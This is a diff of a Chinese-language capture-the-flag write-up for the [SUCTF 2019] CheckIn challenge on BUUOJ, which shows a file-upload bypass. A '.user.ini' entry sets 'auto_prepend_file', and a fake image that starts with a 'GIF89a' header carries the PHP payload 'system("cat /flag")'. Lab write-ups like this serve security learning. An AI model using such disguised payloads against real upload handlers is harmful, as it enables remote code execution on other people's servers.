@@ -1,3 +1,10 @@
+---
+title: 通过上传.user.ini配置文件来执行上传的文件
+---
+
+
+# 通过上传 `.user.ini` 配置文件来执行上传的文件
+
 [题目链接](https://buuoj.cn/challenges#[SUCTF%202019]CheckIn)
 
 ## 过程
@@ -21,6 +28,7 @@ auto_prepend_file = catflag.jpg
 
 紧接着上传 `catflag.jpg` ：
 ```php
+GIF89a
 <script language="php">system("cat /flag");</script>
 ```
 
